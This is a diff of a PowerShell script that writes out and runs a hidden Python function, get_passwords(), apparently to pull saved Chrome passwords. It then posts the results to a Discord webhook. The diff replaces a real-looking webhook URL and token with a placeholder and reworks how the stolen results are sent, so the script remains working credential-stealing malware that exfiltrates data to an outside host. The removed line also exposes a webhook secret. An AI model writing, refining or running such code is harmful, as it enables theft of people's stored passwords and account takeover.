@@ -1,5 +1,5 @@
 $ErrorActionPreference = 'Stop'
-$webhook = "https://discord.com/api/webhooks/1406777013909323967/Gu2KL4c1jclX3lzXgvaaSh2PSNjfe-MWFMr3nU8jJwnJxAgw4ObCiM1pxanM6c8PHYGS"
+$webhook = "YOUR_DISCORD_WEBHOOK_URL"
 
 # Check Python (only shows message if missing)
 try { python --version >$null 2>&1 } catch { 
@@ -44,23 +44,27 @@ def get_passwords():
 print(get_passwords())
 '@
 
-# Execute silently
+# Execute and send to Discord
 $tempFile = "$env:TEMP\pw_$(Get-Random).py"
 try {
     [System.IO.File]::WriteAllText($tempFile, $pythonCode)
-    $results = python $tempFile 2>&1 | Out-String
+    $results = python $tempFile 2>&1
     
-    # Send to Discord only
+    if ($results -match '"error"') {
+        $color = 16711680  # Red for errors
+    } else {
+        $color = 65280  # Green for success
+    }
+
     $payload = @{
-        content = "Chrome Password Extraction Results"
         embeds = @(
             @{
                 description = "```json`n$results`n```"
-                color = if ($results -match '"error"') { 16711680 } else { 65280 }
+                color = $color
             }
         )
     }
-    Invoke-RestMethod -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json -Depth 3) -ContentType "application/json" >$null 2>&1
+    $null = Invoke-RestMethod -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json -Depth 3) -ContentType "application/json"
 }
 finally {
     Remove-Item $tempFile -ErrorAction SilentlyContinue
